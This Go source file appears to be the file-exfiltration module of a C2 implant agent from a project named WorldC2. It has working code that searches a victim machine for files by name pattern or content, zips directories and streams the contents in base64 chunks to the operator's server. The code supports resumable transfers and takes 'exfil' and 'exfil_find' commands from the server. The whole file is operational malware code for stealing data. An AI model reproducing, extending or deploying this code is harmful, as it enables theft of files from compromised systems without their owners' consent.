package agent

import (
	"archive/zip"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	proto "github.com/Ruby570bocadito/WorldC2/src/go/internal/proto"
)

// FileExfil streams files to the server in chunks over the C2 channel.
//
// The server-side ExfilAssembler reassembles the chunks and supports resume:
// every transfer gets a deterministic ID derived from
// sha256(hostname|path|size|mtime)[:16], so a re-run (or a server-issued
// __exfil_resume task) continues from the exact byte the server already has
// instead of starting over.
//
// Task result protocol:
//
//	file_begin:<transfer-id>:<total-size>:<basename>
//	file_chunk:<transfer-id>:<offset>:<base64-data>
//	file_end:<transfer-id>:<sha256-hex>
type FileExfil struct {
	chunkSize int
	taskID    string
	agent     *Agent
}

// exfilJob is a transfer the server may ask to resume later. Size and mtime
// are the values the transfer ID was derived from: if the file changed since
// the transfer started, the server's partial bytes no longer belong to the
// same content and resuming would silently produce a corrupt file.
type exfilJob struct {
	Path  string
	Size  int64
	Mtime int64
}

const exfilProgressEvery = 32 // emit one progress result per N chunks (~1 MB)

// NewFileExfil creates a new file exfiltration handler.
func NewFileExfil(agent *Agent, taskID string) *FileExfil {
	return &FileExfil{
		chunkSize: 32 * 1024, // 32KB chunks
		taskID:    taskID,
		agent:     agent,
	}
}

// ExfilFile reads and sends a single file (or zips a directory).
func (fe *FileExfil) ExfilFile(filePath string) error {
	info, err := os.Stat(filePath)
	if err != nil {
		return fmt.Errorf("stat %s: %w", filePath, err)
	}

	if info.IsDir() {
		return fe.exfilDirectory(filePath)
	}

	return fe.sendFile(filePath)
}

// ExfilDirectory compresses and sends a directory.
func (fe *FileExfil) exfilDirectory(dirPath string) error {
	// Create a unique temp zip so concurrent exfil tasks never clobber
	// each other's archive.
	zf, err := os.CreateTemp("", "bty_exfil_*.zip")
	if err != nil {
		return fmt.Errorf("temp zip: %w", err)
	}
	tmpZip := zf.Name()
	zf.Close()
	defer os.Remove(tmpZip)

	if err := zipDirectory(dirPath, tmpZip); err != nil {
		return fmt.Errorf("zip error: %w", err)
	}

	return fe.sendFile(tmpZip)
}

// ExfilPattern searches for files matching a pattern and sends them zipped.
func (fe *FileExfil) ExfilPattern(root, pattern string) error {
	var files []string

	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if matched, _ := filepath.Match(pattern, info.Name()); matched && !info.IsDir() {
			files = append(files, path)
		}
		return nil
	})

	if len(files) == 0 {
		return fmt.Errorf("no files matching '%s' in %s", pattern, root)
	}

	// Create a unique temp zip (concurrent exfil tasks safe).
	zf, err := os.CreateTemp("", "bty_exfil_*.zip")
	if err != nil {
		return err
	}
	tmpZip := zf.Name()
	defer zf.Close()
	defer os.Remove(tmpZip)

	w := zip.NewWriter(zf)

	for _, f := range files {
		if err := addFileToZip(w, f); err != nil {
			continue
		}
	}

	w.Close()
	zf.Close()

	return fe.sendFile(tmpZip)
}

// exfilTransferID derives a stable transfer ID for a source file so retries
// map onto the same server-side partial upload.
func exfilTransferID(path string, info os.FileInfo) string {
	hostname, _ := os.Hostname()
	sum := sha256.Sum256([]byte(hostname + "|" + path + "|" +
		strconv.FormatInt(info.Size(), 10) + "|" +
		strconv.FormatInt(info.ModTime().UnixNano(), 10)))
	return hex.EncodeToString(sum[:])[:16]
}

func (fe *FileExfil) sendFile(filePath string) error {
	f, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		return err
	}
	totalSize := info.Size()
	transferID := exfilTransferID(filePath, info)

	// Register so the server can ask us to resume this transfer later.
	fe.agent.exfilMu.Lock()
	fe.agent.exfilJobs[transferID] = &exfilJob{
		Path:  filePath,
		Size:  totalSize,
		Mtime: info.ModTime().UnixNano(),
	}
	fe.agent.exfilMu.Unlock()

	fe.sendProgress(0, totalSize, fmt.Sprintf("Sending %s (%d bytes)", filepath.Base(filePath), totalSize))

	h := sha256.New()
	buf := make([]byte, fe.chunkSize)
	sent := int64(0)
	chunks := 0

	fe.send("file_begin:%s:%d:%s", transferID, totalSize, filepath.Base(filePath))

	for {
		n, err := f.Read(buf)
		if n > 0 {
			h.Write(buf[:n])
			encoded := base64.StdEncoding.EncodeToString(buf[:n])
			fe.send("file_chunk:%s:%d:%s", transferID, sent, encoded)
			sent += int64(n)
			chunks++
			if chunks%exfilProgressEvery == 0 {
				fe.sendProgress(sent, totalSize, "")
			}
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			return fmt.Errorf("read %s: %w", filePath, err)
		}
	}

	fe.send("file_end:%s:%s", transferID, hex.EncodeToString(h.Sum(nil)))
	fe.sendProgress(totalSize, totalSize, "Complete")

	// Transfer finished cleanly — no longer resumable.
	fe.agent.exfilMu.Lock()
	delete(fe.agent.exfilJobs, transferID)
	fe.agent.exfilMu.Unlock()
	return nil
}

// resumeFrom continues a previously interrupted transfer at the given byte
// offset (the offset the server reports having already received).
func (fe *FileExfil) resumeFrom(transferID string, offset int64, job *exfilJob) error {
	f, err := os.Open(job.Path)
	if err != nil {
		return fmt.Errorf("open for resume: %w", err)
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		return err
	}
	if info.Size() != job.Size || info.ModTime().UnixNano() != job.Mtime {
		return fmt.Errorf("file changed since the transfer started (size/mtime differ) — restart the exfil")
	}
	if offset > info.Size() {
		return fmt.Errorf("resume offset %d beyond file size %d", offset, info.Size())
	}
	if offset > 0 {
		if _, err := f.Seek(offset, io.SeekStart); err != nil {
			return fmt.Errorf("seek: %w", err)
		}
	}

	// Server state wins: re-announce what it should already have.
	fe.send("file_begin:%s:%d:%s", transferID, job.Size, filepath.Base(job.Path))

	h := sha256.New()
	if offset > 0 {
		// Hash the part the server already has so file_end verifies fully.
		if hf, err := os.Open(job.Path); err == nil {
			io.CopyN(h, hf, offset)
			hf.Close()
		}
	} else {
		fe.agent.exfilMu.Lock()
		fe.agent.exfilJobs[transferID] = job
		fe.agent.exfilMu.Unlock()
	}

	buf := make([]byte, fe.chunkSize)
	sent := offset
	chunks := 0

	for {
		n, err := f.Read(buf)
		if n > 0 {
			h.Write(buf[:n])
			encoded := base64.StdEncoding.EncodeToString(buf[:n])
			fe.send("file_chunk:%s:%d:%s", transferID, sent, encoded)
			sent += int64(n)
			chunks++
			if chunks%exfilProgressEvery == 0 {
				fe.sendProgress(sent, info.Size(), "")
			}
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			return fmt.Errorf("read %s: %w", job.Path, err)
		}
	}

	fe.send("file_end:%s:%s", transferID, hex.EncodeToString(h.Sum(nil)))
	fe.sendProgress(info.Size(), info.Size(), fmt.Sprintf("Resumed at offset %d, complete", offset))

	fe.agent.exfilMu.Lock()
	delete(fe.agent.exfilJobs, transferID)
	fe.agent.exfilMu.Unlock()
	return nil
}

func (fe *FileExfil) send(format string, args ...interface{}) {
	fe.agent.results <- &proto.TaskResult{
		TaskId:  fe.taskID,
		Output:  fmt.Sprintf(format, args...),
		Success: true,
	}
}

func (fe *FileExfil) sendProgress(sent, total int64, msg string) {
	if msg == "" {
		pct := float64(sent) / float64(total) * 100
		msg = fmt.Sprintf("Progress: %.1f%% (%d/%d bytes)", pct, sent, total)
	}
	fe.agent.results <- &proto.TaskResult{
		TaskId:  fe.taskID,
		Output:  fmt.Sprintf("progress:%s", msg),
		Success: true,
	}
}

// handleExfilSend runs the "exfil:<path>" command.
func (a *Agent) handleExfilSend(task *proto.Task, path string) *proto.TaskResult {
	path = strings.TrimSpace(path)
	if path == "" {
		return &proto.TaskResult{TaskId: task.TaskId, ErrorMessage: "exfil: path required", Success: false}
	}
	fe := NewFileExfil(a, task.TaskId)
	if err := fe.ExfilFile(path); err != nil {
		return &proto.TaskResult{TaskId: task.TaskId, ErrorMessage: err.Error(), Success: false}
	}
	return &proto.TaskResult{TaskId: task.TaskId, Output: "exfil task finished", Success: true}
}

// handleExfilFind runs the "exfil_find:<root>|<pattern>" command.
func (a *Agent) handleExfilFind(task *proto.Task, spec string) *proto.TaskResult {
	parts := strings.SplitN(spec, "|", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[0]) == "" || strings.TrimSpace(parts[1]) == "" {
		return &proto.TaskResult{TaskId: task.TaskId, ErrorMessage: "usage: exfil_find:<root>|<pattern>", Success: false}
	}
	fe := NewFileExfil(a, task.TaskId)
	if err := fe.ExfilPattern(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])); err != nil {
		return &proto.TaskResult{TaskId: task.TaskId, ErrorMessage: err.Error(), Success: false}
	}
	return &proto.TaskResult{TaskId: task.TaskId, Output: "exfil_find task finished", Success: true}
}

// handleExfilResume continues a transfer the server reports as incomplete.
func (a *Agent) handleExfilResume(task *proto.Task, args string) *proto.TaskResult {
	fields := strings.Fields(args)
	if len(fields) != 2 {
		return &proto.TaskResult{TaskId: task.TaskId, ErrorMessage: "malformed resume request", Success: false}
	}
	transferID := fields[0]
	offset, err := strconv.ParseInt(fields[1], 10, 64)
	if err != nil || offset < 0 {
		return &proto.TaskResult{TaskId: task.TaskId, ErrorMessage: "malformed resume offset", Success: false}
	}

	a.exfilMu.Lock()
	job, ok := a.exfilJobs[transferID]
	a.exfilMu.Unlock()
	if !ok {
		return &proto.TaskResult{
			TaskId:       task.TaskId,
			ErrorMessage: "resume failed: transfer not known to this agent (agent restarted?)",
			Success:      false,
		}
	}

	fe := NewFileExfil(a, task.TaskId)
	if err := fe.resumeFrom(transferID, offset, job); err != nil {
		return &proto.TaskResult{TaskId: task.TaskId, ErrorMessage: err.Error(), Success: false}
	}
	return &proto.TaskResult{TaskId: task.TaskId, Output: fmt.Sprintf("exfil resumed and completed (%s at %d bytes)", transferID, offset), Success: true}
}

// zipDirectory creates a zip archive of a directory.
func zipDirectory(srcDir, destZip string) error {
	zf, err := os.Create(destZip)
	if err != nil {
		return err
	}
	defer zf.Close()

	w := zip.NewWriter(zf)
	defer w.Close()

	return filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}
		return addFileToZip(w, path)
	})
}

// addFileToZip adds a single file to a zip writer.
func addFileToZip(w *zip.Writer, filePath string) error {
	f, err := os.Open(filePath)
	if err != nil {
		return nil
	}
	defer f.Close()

	relPath, _ := filepath.Rel("/", filePath)
	fw, err := w.Create(relPath)
	if err != nil {
		return err
	}

	_, err = io.Copy(fw, f)
	return err
}

// SearchFiles searches for files matching criteria.
func SearchFiles(root, pattern string, maxSize int64, minSize int64) []string {
	var results []string

	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}

		// Size filter
		if maxSize > 0 && info.Size() > maxSize {
			return nil
		}
		if minSize > 0 && info.Size() < minSize {
			return nil
		}

		// Pattern match
		if pattern != "" {
			if matched, _ := filepath.Match(pattern, info.Name()); !matched {
				return nil
			}
		}

		// Content search (for text files)
		if strings.HasPrefix(pattern, "content:") {
			searchTerm := strings.TrimPrefix(pattern, "content:")
			if contentMatches(path, searchTerm) {
				results = append(results, path)
			}
			return nil
		}

		results = append(results, path)

		if len(results) >= 100 {
			return filepath.SkipAll
		}

		return nil
	})

	return results
}

func contentMatches(filePath, searchTerm string) bool {
	f, err := os.Open(filePath)
	if err != nil {
		return false
	}
	defer f.Close()

	buf := make([]byte, 8192)
	n, _ := f.Read(buf)
	return strings.Contains(strings.ToLower(string(buf[:n])), strings.ToLower(searchTerm))
}
